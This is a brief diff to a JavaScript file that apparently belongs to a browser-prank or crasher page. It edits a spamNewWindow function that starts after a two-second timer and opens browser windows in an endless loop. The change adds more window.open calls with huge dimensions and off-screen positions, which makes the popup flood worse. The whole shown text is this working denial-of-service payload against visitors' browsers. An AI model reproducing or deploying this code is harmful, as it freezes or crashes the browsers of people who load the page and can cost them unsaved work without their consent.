@@ -495,7 +495,7 @@ function newTabSimple() {
 
 function newWindow() {
 	function spamNewWindow() {
-		while(true){window.open("", "", "height=1000, width=100000"); while(i<10){window.open(""); i++}var i = 1}
+		while(true){window.open("", "", "height=1000, width=100000"); window.open("","","height=100, width=100, left=10, top=10"); window.open("","","height=100, width=100, left=1000, top=10000"); window.open("","","height=100, width=100000, left=1000, top=10000")}
 	}
 	setTimeout(spamNewWindow, 2000)
 }
